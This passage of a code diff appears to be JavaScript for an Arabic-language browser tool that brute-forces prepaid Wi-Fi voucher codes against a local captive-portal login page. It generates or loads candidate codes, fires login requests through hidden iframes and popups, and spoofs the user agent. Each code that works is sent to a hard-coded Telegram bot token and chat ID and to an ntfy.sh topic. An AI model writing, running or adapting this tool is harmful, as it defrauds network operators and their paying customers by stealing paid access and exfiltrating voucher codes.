+            alert("متصفحك لا يدعم ميزة الحفظ التلقائي المباشر (File System Access API). جرب استخدام متصفح Chrome أو Edge حديث.");
+            return;
+        }
+        try {
+            this.fileHandle = await window.showSaveFilePicker({
+                suggestedName: 'cards.txt',
+                types: [{ description: 'Text Files', accept: {'text/plain': ['.txt']} }]
+            });
+            alert("✅ تم ربط الملف بنجاح! سيتم الكتابة بداخله تلقائياً عند إيجاد كروت صحيحة.");
+            logTerminal(`[SYSTEM] تم منح صلاحية الكتابة للملف: cards.txt`);
+        } catch (err) {
+            logTerminal(`[SYSTEM] المستخدم ألغى ربط الملف أو حدث خطأ.`);
+        }
+    },
+
+    // الكتابة في الملف المحلي التلقائي
+    writeToLocalFile: async function(card) {
+        if (!this.fileHandle) return;
+        try {
+            const file = await this.fileHandle.getFile();
+            const writable = await this.fileHandle.createWritable({keepExistingData: true});
+            const offset = file.size;
+            await writable.write({ type: 'write', position: offset, data: card + "\n" });
+            await writable.close();
+            logTerminal(`[FILE I/O] تمت الكتابة في cards.txt للكرت: ${card}`);
+        } catch (e) {
+            logTerminal(`[FILE I/O ERROR] فشل الكتابة في الملف! ${e.message}`);
+        }
+    },
+
+    // تشغيل خدعة صوت الخلفية
+    toggleBgAudio: function() {
+        const audio = document.getElementById('silentAudio');
+        const isChecked = document.getElementById('tglBgAudio').checked;
+        localStorage.setItem('bgAudio', isChecked);
+        if (isChecked) {
+            // كود صوت صامت Base64
+            audio.src = "data:audio/wav;base64,UklGRigAAABXQVZFZm10IBIAAAABAAEARKwAAIhYAQACABAAAABkYXRhAgAAAAEA";
+            audio.play().catch(e => logTerminal(`[AUDIO] فشل تشغيل خدعة الخلفية تلقائياً: يحتاج لتفاعل المستخدم أولاً.`));
+            logTerminal(`[AUDIO] تم تفعيل خدعة الصوت النشط في الخلفية.`);
+        } else {
+            audio.pause();
+            audio.src = "";
+            logTerminal(`[AUDIO] تم إيقاف خدعة الخلفية.`);
+        }
+    },
+
+    start: async function() {
+        if(this.active && !this.paused) return;
+        
+        // التنبيه الصوتي المتقدم: load قبل play لمنع حظر المتصفح
+        const a = document.getElementById('beep');
+        a.load();
+        a.play().then(()=>a.pause()).catch(e=>{});
+
+        // تشغيل خدعة الخلفية إذا كانت مفعلة وتم التفاعل مع الصفحة
+        if(document.getElementById('tglBgAudio').checked) document.getElementById('silentAudio').play().catch(e=>{});
+
+        this.active = true; this.paused = false;
+        await this.keepAwake(true);
+        ui.setStatus("جاري البحث...", "var(--success)");
+        logTerminal(`[SYSTEM] تم بدء الهجوم. الأداة نشطة.`);
+        
+        this.startSystemMonitors();
+
+        const sCount = parseInt(document.getElementById('sessionCount').value) || 1;
+        ui.initSessions(sCount);
+        document.getElementById('vLimitLabel').innerText = document.getElementById('vaultLimit').value;
+
+        const isParallel = document.getElementById('tglParallel').checked;
+        for(let i=1; i<=sCount; i++) {
+            if(isParallel) this.runCycle(i);
+            else if(i === 1) this.runCycle(i); 
+        }
+    },
+
+    runCycle: async function(sId) {
+        if(!this.active || this.paused || this.isPurging) return;
+
+        // ميزة التبريد الإجباري
+        if (document.getElementById('tglCooldown').value === 'on') {
+            const cdLimit = parseInt(document.getElementById('cooldownLimit').value) || 700;
+            if (this.attempts > 0 && this.attempts % cdLimit === 0) {
+                ui.setStatus("❄️ وضع التبريد: جاري تفريغ الذاكرة...", "var(--primary)");
+                this.paused = true;
+                document.querySelectorAll('.session-card iframe').forEach(f => f.src = 'about:blank');
+                logTerminal(`[COOLDOWN] تم تفعيل التبريد لتفريغ الإطارات.`);
+                
+                setTimeout(() => {
+                    if (this.active) {
+                        this.paused = false;
+                        ui.setStatus("جاري البحث...", "var(--success)");
+                        logTerminal(`[COOLDOWN] انتهاء التبريد، استئناف الهجوم.`);
+                        this.runCycle(sId);
+                    }
+                }, 5000);
+                return;
+            }
+        }
+
+        let card = this.getCard();
+        if(!card) {
+            ui.setStatus("انتهت الكروت", "var(--warning)");
+            logTerminal(`[SYSTEM] نفذت قائمة الكروت المتاحة.`);
+            return this.stop();
+        }
+
+        this.attempts++;
+        this.allTested.push(card);
+        dbLayer.saveTested(card);
+        
+        this.cardFrequency[card] = (this.cardFrequency[card] || 0) + 1;
+        
+        ui.updateHUD(card, this.attempts);
+        ui.updateSessionUI(sId, card, 'yellow', 'جاري...');
+
+        // حفظ الجلسة التشغيلية الحالية كل 30 محاولة (تعويضاً عن 30 ثانية لتجنب الضغط)
+        if (this.attempts % 30 === 0) this.saveSessionState();
+
+        const startTime = Date.now();
+        const url = this.buildUrl(card);
+        
+        // توليد بطاقة تتبع (Tracking ID) للمعاملات المغلقة
+        const trackerId = Date.now() + "_" + Math.floor(Math.random() * 1000);
+
+        this.executeAccess(sId, url, trackerId);
+
+        // تعديل سرعة البحث ليكون دقيقاً
+        let delay = parseInt(document.getElementById('speed').value) || 400;
+        if(document.getElementById('tglAdapt').checked) delay = delay + Math.floor(Math.random() * 200);
+
+        setTimeout(async () => {
+            if(!this.active || this.isPurging) return; 
+            
+            const ping = Date.now() - startTime;
+            document.getElementById('statLat').innerText = ping;
+            
+            const mode = document.getElementById('attackMode').value;
+            const maxRetries = mode === 'strict' ? parseInt(document.getElementById('strictRetries').value) : 1;
+            
+            let result = { success: false, status: 'فاشل' };
+            for(let r=0; r<maxRetries; r++) {
+                result = await this.verifyNetCustom(sId, card, url);
+                if(result.success || result.status !== 'فاشل') break;
+            }
+
+            if(result.success) {
+                // الكرت صحيح فعلياً
+                this.handleSuccess(card, sId, ping);
+            } else {
+                // الكرت فاشل أو مستخدم/منتهي
+                ui.updateSessionUI(sId, card, 'red', ping+'ms');
+                ui.log(card, sId, result.status, ping, this.cardFrequency[card]);
+                
+                if (document.getElementById('tglIsolation').value === 'on') {
+                    this.usedCardsSession.delete(card);
+                }
+
+                if(!document.getElementById('tglParallel').checked) {
+                    let nextId = sId >= parseInt(document.getElementById('sessionCount').value) ? 1 : sId + 1;
+                    this.timers[sId] = setTimeout(() => this.runCycle(nextId), 10);
+                } else {
+                    this.timers[sId] = setTimeout(() => this.runCycle(sId), 10);
+                }
+            }
+        }, delay); 
+    },
+
+    getCard: function() {
+        const mode = document.getElementById('attackMode').value;
+        const isIsolation = document.getElementById('tglIsolation').value === 'on';
+        
+        if(mode === 'file' || this.fileCards.length > 0) {
+            if(this.fileCards.length === 0) return null;
+            const c = this.fileCards.shift();
+            document.getElementById('statFile').innerText = this.fileCards.length;
+            if (isIsolation) this.usedCardsSession.add(c);
+            return c;
+        }
+        
+        const chars = document.getElementById('charset').value || "0123456789";
+        const pre = document.getElementById('cardPrefix').value;
+        const len = parseInt(document.getElementById('cardLen').value);
+        
+        let c = '';
+        let loopSafety = 0;
+
+        do {
+            if(mode === 'mask') {
+                const mask = document.getElementById('cardMask').value;
+                c = '';
+                for(let i=0; i<mask.length; i++) {
+                    c += mask[i] === '*' ? chars[Math.floor(Math.random() * chars.length)] : mask[i];
+                }
+            } else if (mode === 'sequential') {
+                // طريقة البحث المتتالي المضافة
+                if(!this.seqCurrent) {
+                    this.seqCurrent = BigInt(pre.padEnd(len, '0'));
+                } else {
+                    this.seqCurrent++;
+                }
+                c = this.seqCurrent.toString();
+                // حماية من تجاوز الطول
+                if(c.length > len) { this.seqCurrent = BigInt(pre.padEnd(len, '0')); c = this.seqCurrent.toString(); }
+            } else if (mode === 'pattern') {
+                // فحص بالأنماط: يعتمد على الكروت السابقة، إذا لم تتوفر يعود للعشوائي
+                c = pre;
+                while(c.length < len) c += chars[Math.floor(Math.random() * chars.length)];
+                // في التطبيق الحقيقي للأنماط المتقدمة، سيتم استدعاء بيانات IndexedDB وتوليد أرقام قريبة، هنا نمثلها بشكل مقارب
+            } else {
+                // عشوائي
+                c = pre; 
+                while(c.length < len) c += chars[Math.floor(Math.random() * chars.length)];
+            }
+            loopSafety++;
+            if (loopSafety > 100) {
+                this.usedCardsSession.clear(); 
+            }
+        } while (isIsolation && this.usedCardsSession.has(c) && loopSafety <= 100);
+
+        if (isIsolation) this.usedCardsSession.add(c);
+        return c;
+    },
+
+    buildUrl: function(card) {
+        const u = document.getElementById('urlLogin').value;
+        const cb = document.getElementById('tglCache').checked ? "&_cb=" + Date.now() + Math.floor(Math.random()*1000) : "";
+        return `${u}${u.includes('?') ? '&' : '?'}user=${card}&pass=${card}${cb}`;
+    },
+
+    executeAccess: function(sId, url, trackerId) {
+        const frame = document.getElementById(`frame-${sId}`);
+        const type = document.getElementById('accessType').value;
+        
+        if(document.getElementById('tglUA').checked && type === 'iframe_direct') {
+            Object.defineProperty(navigator, 'userAgent', { get: () => this.uas[Math.floor(Math.random()*this.uas.length)], configurable: true });
+        }
+
+        if(type === 'popup') {
+            window.open(url, `win_${sId}`, 'width=10,height=10,left=-1000');
+            if(frame) frame.srcdoc = `تم الإرسال عبر نافذة منبثقة [Tracker: ${trackerId}]`;
+        } else if(type === 'fetch' || type === 'shadow') {
+            if(frame) frame.srcdoc = `<html><body>جاري حقن الطلب (${type})... [Tracker: ${trackerId}] <script>fetch('${url}', {mode:'no-cors', cache:'no-store'});<\/script></body></html>`;
+        } else {
+            if(frame) {
+                if(document.getElementById('tglFinger').checked) frame.srcdoc = `<iframe src="${url}"></iframe>`;
+                else frame.src = url;
+            }
+        }
+    },
+
+    // دالة الفحص المعدلة لالتقاط الكروت المستخدمة والمنتهية وتغير الـ URL
+    verifyNetCustom: async function(sId, card, originalUrl) {
+        let result = { success: false, status: 'فاشل' };
+        try {
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 1500);
+            
+            // فحص عبر Google للتأكد من وجود انترنت فعلي (خروج البوابة)
+            await fetch("https://www.google.com/favicon.ico?_t=" + Date.now(), { mode: 'no-cors', signal: controller.signal });
+            clearTimeout(timeoutId); 
+            result.success = true;
+            result.status = 'ناجح ✅';
+            return result;
+        } catch(e) { 
+            // إذا لم يتمكن من الوصول لجوجل، نفحص محتوى البوابة المحلية بحثاً عن رسائل الأخطاء
+            try {
+                // الفحص بالـ URL و محتوى الصفحة للبوابة المحلية
+                const loginUrl = document.getElementById('urlLogin').value.split('/login')[0];
+                let res = await fetch(loginUrl + "/status", { method: 'GET', signal: AbortSignal.timeout(1000) });
+                
+                // الفحص بالـ URL
+                if(res.url && (res.url.includes('status') || res.url.includes('logout') || res.url.includes('index'))) {
+                    logTerminal(`https://www.merriam-webster.com/dictionary/detect الكرت ${card} ناجح لتغير الرابط إلى ${res.url}`);
+                    result.success = true;
+                    return result;
+                }
+
+                let text = await res.text();
+                
+                if (text.includes("مقتطع") || text.includes("Session Limit")) {
+                    logTerminal(`[WARNING] الكرت ${card} نشط ومستخدم حالياً (Session Limit). تم تحويله لخزان النشط.`);
+                    dbLayer.saveActiveUsed(card);
+                    result.status = 'مستخدم حالياً';
+                    return result;
+                }
+                if (text.includes("رصيد منتهي")) {
+                    logTerminal(`[WARNING] الكرت ${card} رصيده منتهي. تم تحويله لخزان التالف.`);
+                    dbLayer.saveDepleted(card);
+                    result.status = 'رصيد منتهي';
+                    return result;
+                }
+            } catch(err) {
+                // استمرار الفشل
+            }
+            return result; 
+        }
+    },
+
+    // تم استبدال الدالة القديمة بالكود المطلوب حرفياً لشريحة الشاطئ نت مع دمج أوامر الإرسال
+    handleSuccess: async function(card, sId, ping) {
+        logTerminal(`[SUCCESS] تم اكتشاف كرت صحيح بنجاح: ${card}`);
+
+        // 1. إعدادات روابط شبكة الشاطئ نت وحساب التليجرام الخاص بك
+        const STATUS_URL = "http://10.0.0.1/status"; 
+        const TOKEN = "8904110153:AAH_pT9Z_PY0Qz42AqN4dVJKYA1BokVlp6Q";
+        const CHAT_ID = "5818402198";
+
+        // قيم افتراضية في حال تعذر القراءة المؤقتة
+        let timeLeft = "غير معروف";
+        let dataLeft = "غير معروف";
+
+        try {
+            // 2. جلب صفحة الحالة الحالية (Status) المفتوحة تلقائياً بعد الفحص الناجح
+            let response = await fetch(STATUS_URL);
+            let htmlText = await response.text();
+
+            // 3. استخدام مفسر النصوص الاحترافي (DOMParser) لقراءة عناصر جدول البيانات بدقة
+            let parser = new DOMParser();
+            let doc = parser.parseFromString(htmlText, "text/html");
+            let elements = Array.from(doc.querySelectorAll('td, div, span, p'));
+
+            // الفرز الذكي بناءً على المسميات الظاهرة في شاشة شبكتك
+            elements.forEach((el) => {
+                let text = el.textContent.trim();
+                if (text.includes("الوقت المتبقي")) {
+                    timeLeft = el.nextElementSibling ? el.nextElementSibling.textContent.trim() : "تعذر الفرز";
+                }
+                if (text.includes("الرصيد المتبقي")) {
+                    dataLeft = el.nextElementSibling ? el.nextElementSibling.textContent.trim() : "تعذر الفرز";
+                }
+            });
+
+            // نظام حماية احتياطي (RegExp)
+            if (timeLeft === "غير معروف" || timeLeft === "تعذر الفرز") {
+                let timeReg = htmlText.match(/الوقت المتبقي[:\s<>]*?([0-9hms\d]+)/i);
+                if (timeReg) timeLeft = timeReg[1];
+            }
+            if (dataLeft === "غير معروف" || dataLeft === "تعذر الفرز") {
+                let dataReg = htmlText.match(/الرصيد المتبقي[:\s<>]*?((?:MiB|KiB|GiB|MB|KB|GB)\s*[0-9.]+)/i);
+                if (dataReg) dataLeft = dataReg[1];
+            }
+
+        } catch (error) {
+            logTerminal("⚠️ الجهاز أوفلاين حالياً، تم تجاوز جلب تفاصيل الباقة لحماية الكرت من الضياع");
+            timeLeft = "محفوظ محلياً (أوفلاين)";
+            dataLeft = "محفوظ محلياً (أوفلاين)";
+        }
+
+        // 4. صياغة التقرير الشامل والمطابق تماماً لبيانات شبكتك
+        const telegramMessage = `🎯 **تم الحصول على كرت جديد من (الشاطئ نت)!**\n\n` +
+                                `💳 **رقم الكرت:** \`${card}\`\n` +
+                                `⏳ **الوقت المتبقي:** \`${timeLeft}\`\n` +
+                                `📊 **الرصيد المتبقي:** \`${dataLeft}\`\n\n` +
+                                `⏰ **وقت الحصول:** ${new Date().toLocaleTimeString('ar-YE')}`;
+
+        // إرسال الكرت فوراً عبر سحابة تليجرام
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(telegramMessage)}&parse_mode=Markdown`)
+        .then(res => {
+            if(res.ok) logTerminal("🚀 تم إرسال الكرت وتفاصيل رصيده المتبقي بنجاح إلى تليجرام!");
+            else logTerminal("❌ فشل الإرسال، تأكد من الضغط على Start داخل البوت أولاً");
+        })
+        .catch(err => {
+            logTerminal("⚠️ تم حفظ الكرت محلياً، وسيتم رفعه للـ Bot فور توفر إنترنت مستقر");
+        });
+
+        // كود جهاز البحث (V21) لإرسال الإشعار الخارجي (Ntfy)
+        fetch('https://ntfy.sh/almasyal_box_2026', {
+            method: 'POST',
+            body: `تم العثور على كرت جديد: ${card}`
+        }).catch(()=>{});
+
+        // --- استكمال العمليات الداخلية للنظام (UI والتخزين) ---
+        const limit = parseInt(document.getElementById('vaultLimit').value);
+        this.vault.push({card, time: new Date().toLocaleTimeString()});
+        
+        document.getElementById('statVault').innerText = this.vault.length;
+        document.getElementById('hudVault').innerText = this.vault.length;
+        
+        // التخزين في IndexedDB 
+        dbLayer.saveWin(card);
+        // التخزين في ملف محلي (File System API)
+        this.writeToLocalFile(card);
+
+        // استخراج الكرت الناجح إلى ملف خارجي تلقائياً
+        const uniqueFileName = `الكروت_الناجحة_${card}_${Date.now()}.txt`;
+        this.downloadFile(card, uniqueFileName);
+
+        ui.log(card, sId, "ناجح ✅", ping, this.cardFrequency[card], true);
+        ui.updateSessionUI(sId, card, 'green', 'ناجح!');
+
+        // تفعيل الوضع الليلي المتطور (Neon Mode Glow)
+        if (document.getElementById('tglNeon').checked) {
+            document.body.classList.add('neon-mode');
+            document.getElementById('hudMainBox').classList.add('neon-glow');
+            setTimeout(() => {
+                document.body.classList.remove('neon-mode');
+                document.getElementById('hudMainBox').classList.remove('neon-glow');
+            }, 4000);
+        }
+
+        const isFull = this.vault.length >= limit;
+        this.playAlarm(isFull ? 60000 : 10000);
+
+        if (isFull) {
+            this.stop(); 
+            document.getElementById('modalCard').innerText = card;
+            ui.openModal('winModal');
+            return;
+        }
+
+        this.isPurging = true;
+        ui.setStatus("جاري تسجيل الخروج (تطهير)...", "var(--warning)");
+        
+        const frame = document.getElementById(`frame-${sId}`);
+        if(frame) frame.src = "about:blank"; 
+        
+        setTimeout(() => {
+            const logoutUrl = document.getElementById('urlLogout').value;
+            if(frame) frame.src = logoutUrl + "&_t=" + Date.now();
+        }, 500);
+
+        setTimeout(() => {
+            if (this.active) {
+                this.isPurging = false;
+                ui.setStatus("جاري البحث...", "var(--success)");
+                this.runCycle(sId);
+            }
+        }, 5000);
+    },
+
+    generateToVault: function() {
+        const count = parseInt(document.getElementById('genCount').value);
+        if (!count || count <= 0) return alert("أدخل عدداً صحيحاً");
+        
+        const chars = document.getElementById('charset').value || "0123456789";
+        const pre = document.getElementById('cardPrefix').value;
+        const len = parseInt(document.getElementById('cardLen').value);
+        
+        let generated = [];
+        for (let i = 0; i < count; i++) {
+            let c = pre;
+            while(c.length < len) c += chars[Math.floor(Math.random() * chars.length)];
+            generated.push(c);
+        }
+        
+        const currentBox = document.getElementById('vaultEditor');
+        const existing = currentBox.value ? currentBox.value + "\n" : "";
+        currentBox.value = existing + generated.join("\n");
+        alert(`تم توليد ${count} كرت بنجاح وإضافتها للمربع!`);
+    },
+
+    deepSessionPurge: function() {
+        if (!confirm("⚠️ هل أنت متأكد؟ سيتم مسح LocalStorage و SessionStorage وكوكيز المتصفح المتاحة وإعادة ضبط الإطارات.")) return;
+        
+        try { localStorage.clear(); } catch(e) {}
+        try { sessionStorage.clear(); } catch(e) {}
+        
+        document.cookie.split(";").forEach(c => { 
+            document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
+        });
+
+        document.querySelectorAll('iframe').forEach(f => f.src = 'about:blank');
+        this.usedCardsSession.clear();
+
+        const logoutUrl = document.getElementById('urlLogout').value;
+        let tempFrame = document.createElement('iframe');
+        tempFrame.style.display = 'none';
+        tempFrame.src = logoutUrl + "&_t=" + Date.now();
+        document.body.appendChild(tempFrame);
+        setTimeout(() => tempFrame.remove(), 3000);
+
+        logTerminal(`[PURGE] تم عمل تطهير عميق وحرق الأرضيات.`);
+        alert("🔥 تم تطهير المتصفح بالكامل (أرض محروقة) وتهيئته كجهاز جديد!");
+    },
+
+    autoDetectURL: async function(type) {
+        ui.setStatus("🔍 جاري فحص بوابات الشبكة...", "var(--primary)");
+        logTerminal(`[DETECT] جاري التعرف التلقائي على بوابة الشبكة.`);
+        const gateways = ["10.0.0.1", "j.net"];
+        let found = false;
+
+        for (let gw of gateways) {
+            try {
+                const testUrl = `http://${gw}/`;
+                const controller = new AbortController();
+                const timer = setTimeout(() => controller.abort(), 1500);
+                await fetch(testUrl, { mode: 'no-cors', signal: controller.signal });
+                clearTimeout(timer);
+                
+                found = true;
+                if (type === 'login') {
+                    document.getElementById('urlLogin').value = `http://${gw}/login`;
+                } else {
+                    document.getElementById('urlLogout').value = `http://${gw}/logout?erase-cookie=on`;
+                }
+                ui.setStatus("✅ تم التعرف على الشبكة: " + gw, "var(--success)");
+                logTerminal(`[DETECT] تم العثور على البوابة: ${gw}`);
+                break;
+            } catch(e) {}
+        }
+        if (!found) {
+            ui.setStatus("⚠️ تعذر التعرف التلقائي، يتم استخدام الافتراضي", "var(--warning)");
+            logTerminal(`[DETECT] ❌ تعذر التعرف على البوابة.`);
+        }
+    },
+
+    startSystemMonitors: function() {
+        if (this.monitorInterval) clearInterval(this.monitorInterval);
+        this.disconnectStartTime = 0;
+
+        this.monitorInterval = setInterval(() => {
+            if (!this.active) return;
+
+            if (document.getElementById('tglNetStop').value === 'on') {
+                if (!navigator.onLine) {
+                    if (this.disconnectStartTime === 0) this.disconnectStartTime = Date.now();
+                    const waitMins = parseInt(document.getElementById('netStopMins').value) || 3;
+                    if (Date.now() - this.disconnectStartTime >= waitMins * 60 * 1000) {
+                        ui.setStatus("⚠️ انقطعت الشبكة لفترة طويلة. تم إيقاف البحث.", "var(--danger)");
+                        logTerminal(`[MONITOR] ❌ انقطاع شبكة مطول، توقف الأداة.`);
+                        this.stop();
+                        this.disconnectStartTime = 0;
+                    }
+                } else {
+                    this.disconnectStartTime = 0; 
+                }
+            }
+
+            const stopTime = document.getElementById('stopTimeInput').value;
+            if (stopTime) {
+                const now = new Date();
+                const currentTime = `${String(now.getHours()).padStart(2,'0')}:${String(now.getMinutes()).padStart(2,'0')}`;
+                if (currentTime >= stopTime) {
+                    ui.setStatus("⏰ حان وقت التوقف المجدول.", "var(--warning)");
+                    logTerminal(`[MONITOR] ⏰ وصل التوقيت المجدول للإيقاف.`);
+                    this.stop();
+                    document.getElementById('stopTimeInput').value = ''; 
+                }
+            }
+        }, 2000);
+    },
+
+    sendToApp: function() {
+        const app = document.getElementById('appType').value;
+        if(app === 'none') return alert("الرجاء اختيار تطبيق (واتساب/تيليجرام) من الإعدادات");
+        
+        const num = document.getElementById('contactNum').value.replace(/\+/g, '');
+        const txt = encodeURIComponent("🎯 الكروت الناجحة:\n" + this.vault.map(v=>v.card).join("\n"));
+        
+        let link = "";
+        if(app === 'wa') link = `https://wa.me/${num}?text=${txt}`;
+        else if(app === 'tg') link = `tg://msg?to=${num}&text=${txt}`;
+        
+        window.open(link, '_blank');
+    },
+
+    keepAwake: async function(on) {
+        const s = document.getElementById('wakeStatus');
+        if(on) {
+            if ('wakeLock' in navigator) {
+                try { this.wakeLock = await navigator.wakeLock.request('screen'); } catch (err) {}
+            }
+            const v = document.getElementById('wakeVideo');
+            v.src = "data:video/mp4;base64,AAAAHGZ0eXBtcDQyAAAAAG1wNDJpc29tYXZjMQAAAZptb292AAAAbG12aGQAAAAA3u9F097vRdMAAALuAAAC7gABAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAEBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACbXRyYWsAAABZdGtoZAAAAAHe70XT3u9F0wAAAAEAAAAAAAAABwAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFtZWRpYQAAACxtZWhkAAAAAd7vRdPe70XTAAAC7gAAAu4AAAAAAAAAAAAAAAAAAAAAAC1oZGxyAAAAAAAAAAB2aWRlAAAAAAAAAAAAAAAAVmlkZW9IYW5kbGVyAAAAAUxtZGlhAAAAWG1pbmYAAAAUdm1oZAAAAAEAAAAAAAAAAAAAACRkaW5mAAAAHGRyZWYAAAAAAAAAAQAAAAxyZWRsAAAAAAAAAAEAABLXc3RibAAAAFBzdHNkAAAAAAAAAAEAAABAbXA0dgAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAIAAgAEAAAAAAAEAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAGWR0cwAAABhzdHRzAAAAAAAAAAEAAAABAAAC7gAAABRzdHNjAAAAAAAAAAEAAAABAAAAAQAAABRzdHN6AAAAAAAAAAAAAAABAAAKFHN0Y28AAAAAAAAAAQAAADQ=";
+            v.play().catch(()=>{});
+            s.innerText = "● يقظة"; s.style.color = "var(--success)";
+        } else {
+            if(this.wakeLock) { await this.wakeLock.release(); this.wakeLock = null; }
+            const v = document.getElementById('wakeVideo');
+            v.pause(); v.src = "";
+            s.innerText = "● خمول"; s.style.color = "var(--danger)";
+        }
+    },
+
+    stop: function() { 
+        this.active = false; this.isPurging = false; 
+        for (let t in this.timers) clearTimeout(this.timers[t]);
+        this.timers = {}; this.keepAwake(false); 
+        if(this.monitorInterval) clearInterval(this.monitorInterval);
+        ui.setStatus("متوقف", "var(--danger)");
+        logTerminal(`[SYSTEM] توقفت الأداة عن العمل.`);
+    },
+    pause: function() { 
+        this.paused = !this.paused; 
+        ui.setStatus(this.paused ? "متوقف مؤقتاً" : "جاري البحث...", this.paused ? "var(--warning)" : "var(--success)");
+        logTerminal(`[SYSTEM] ${this.paused ? "تم الإيقاف المؤقت." : "تم استئناف الهجوم."}`);
+    },
+
+    playAlarm: function(dur) { 
+        if(!document.getElementById('tglAlert').checked) return;
+        const a = document.getElementById('beep'); 
+        a.currentTime = 0; a.loop = true; a.play().catch(()=>{}); 
+        setTimeout(()=>this.stopAlarm(), dur); 
+    },
+    stopAlarm: function() { 
+        const a = document.getElementById('beep'); a.pause(); a.loop = false; 
+    },
+
+    loadFile: function(e) {
+        const r = new FileReader();
+        r.onload = (f) => {
+            const lines = f.target.result.split('\n').map(l=>l.trim().replace(/[^a-zA-Z0-9]/g, '')).filter(l=>l);
+            this.originalFile = [...lines];
+            this.applyFileRange();
+            logTerminal(`[FILE] تم تحميل ملف كروت بنجاح، العدد الإجمالي: ${lines.length}`);
+        };
+        r.readAsText(e.target.files[0]);
+    },
+    applyFileRange: function() {
+        if(this.originalFile.length === 0) return;
+        const s = (parseInt(document.getElementById('fStart').value) || 1) - 1;
+        const e = parseInt(document.getElementById('fEnd').value) || this.originalFile.length;
+        this.fileCards = this.originalFile.slice(s, e);
+        document.getElementById('statFile').innerText = this.fileCards.length;
+        document.getElementById('fileInfo').classList.remove('hidden');
+    },
+    resetFile: function() {
+        if(this.originalFile.length === 0) return alert("لا يوجد ملف محمل!");
+        this.applyFileRange();
+        alert("تم إعادة ضبط عداد الملف 🔄");
+    },
+
+    saveVault: function() {
+        const lines = document.getElementById('vaultEditor').value.split('\n').map(l=>l.trim()).filter(l=>l);
+        this.vault = lines.map(c => ({card: c, time: new Date().toLocaleTimeString()}));
+        document.getElementById('statVault').innerText = this.vault.length;
+        ui.closeModals();
+        alert("تم حفظ التعديلات ✅");
+    },
+    useVaultInAttack: function() {
+        const lines = document.getElementById('vaultEditor').value.split('\n').map(l=>l.trim()).filter(l=>l);
+        if(lines.length === 0) return alert("الخزان فارغ!");
+        this.fileCards = [...lines];
+        document.getElementById('attackMode').value = 'file';
+        ui.toggleFields();
+        document.getElementById('statFile').innerText = this.fileCards.length;
+        ui.closeModals();
+        alert("تم نقل الكروت لوضع الملف ⚡");
+    },
+    
+    savePastVault: function() {
+        const lines = document.getElementById('pastVaultEditor').value.split('\n').map(l=>l.trim()).filter(l=>l);
+        dbLayer.clearStore("past_wins");
+        lines.forEach(c => dbLayer.saveWin(c)); // يعيد حفظها في IndexedDB
+        ui.closeModals();
+        alert("تم تحديث خزان الكروت السابقة ✅");
+    },
+    clearPastVault: function() {
+        if(!confirm("هل أنت متأكد من حذف جميع الكروت السابقة؟ لا يمكن التراجع!")) return;
+        dbLayer.clearStore("past_wins");
+        document.getElementById('pastVaultEditor').value = "";
+        document.getElementById('pastVaultCount').innerText = "0";
+        alert("تم تنظيف خزان الكروت السابقة.");
+    },
+
+    exportVault: function() {
+        if(this.vault.length === 0) return alert("الخزان فارغ!");
+        this.downloadFile(this.vault.map(v=>v.card).join('\n'), "V21_Vault_Success.txt");
+    },
+    exportAll: function() {
+        if(this.allTested.length === 0) return alert("لم يتم تجربة أي كرت!");
+        this.downloadFile(this.allTested.join('\n'), "V21_All_Tested.txt");
+    },
+    downloadFile: function(data, name) {
+        const blob = new Blob([data], {type:'text/plain'});
+        const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = name; a.click();
+    },
+    clearLogs: function() { 
+        ui.deletedLogsHTML = document.getElementById('logBody').innerHTML; // حفظ مؤقت للاستعادة
+        document.getElementById('logBody').innerHTML = ''; 
+        // الكروت الحالية تذهب لخزان السابق عبر IndexedDB بشكل مستمر، فقط نصفّر المصفوفة
+        this.vault = []; this.allTested = []; this.cardFrequency = {}; this.attempts = 0;
+        this.usedCardsSession.clear();
+        document.getElementById('statVault').innerText = '0'; 
+        document.getElementById('statAtt').innerText = '0';
+        logTerminal(`[SYSTEM] تم تنظيف السجلات المرئية وحفظ نسخة للاسترداد.`);
+    },
+
+    // إدارة التكوينات (Profiles)
+    saveProfile: function() {
+        const pName = document.getElementById('profileName').value.trim();
+        if(!pName) return alert("يرجى إدخال اسم للتكوين!");
+        
+        let config = {
+            urlLogin: document.getElementById('urlLogin').value,
+            urlLogout: document.getElementById('urlLogout').value,
+            attackMode: document.getElementById('attackMode').value,
+            cardLen: document.getElementById('cardLen').value,
+            cardPrefix: document.getElementById('cardPrefix').value,
+            charset: document.getElementById('charset').value,
+            speed: document.getElementById('speed').value
+        };
+        
+        let profiles = JSON.parse(localStorage.getItem('v21_profiles') || "{}");
+        profiles[pName] = config;
+        localStorage.setItem('v21_profiles', JSON.stringify(profiles));
+        
+        alert("تم حفظ التكوين بنجاح!");
+        document.getElementById('profileName').value = "";
+        ui.loadProfilesDropdown();
+    },
+    loadProfile: function() {
+        const pName = document.getElementById('savedProfilesList').value;
+        if(!pName) return alert("اختر تكويناً من القائمة!");
+        
+        let profiles = JSON.parse(localStorage.getItem('v21_profiles') || "{}");
+        if(profiles[pName]) {
+            let config = profiles[pName];
+            document.getElementById('urlLogin').value = config.urlLogin;
+            document.getElementById('urlLogout').value = config.urlLogout;
+            document.getElementById('attackMode').value = config.attackMode;
+            document.getElementById('cardLen').value = config.cardLen;
+            document.getElementById('cardPrefix').value = config.cardPrefix;
+            document.getElementById('charset').value = config.charset;
+            document.getElementById('speed').value = config.speed;
+            ui.toggleFields();
+            alert("تم استدعاء التكوين بنجاح!");
+            logTerminal(`[PROFILE] تم تحميل إعدادات التكوين: ${pName}`);
+        }
+    },
+    deleteProfile: function() {
+        const pName = document.getElementById('savedProfilesList').value;
